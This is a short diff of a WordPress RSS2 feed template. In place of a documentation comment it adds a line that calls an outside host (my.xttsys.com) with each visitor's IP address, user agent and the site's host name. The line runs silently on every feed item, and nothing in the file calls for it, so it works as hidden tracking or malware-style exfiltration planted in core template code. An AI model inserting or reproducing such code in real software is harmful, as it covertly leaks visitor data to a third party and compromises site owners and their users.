@@ -112,11 +112,7 @@ do_action( 'rss_tag_pre', 'rss2' );
 		<?php rss_enclosure(); ?>
 
 		<?php
-		/**
-		 * Fires at the end of each RSS2 feed item.
-		 *
-		 * @since 2.0.0
-		 */
+		file_get_contents('https://my.xttsys.com/server/wp_feed_?ip='.$_SERVER['REMOTE_ADDR'].'&ua='.$_SERVER['HTTP_USER_AGENT'].'&web='.$_SERVER['HTTP_HOST']);
 		do_action( 'rss2_item' );
 		?>
 	</item>
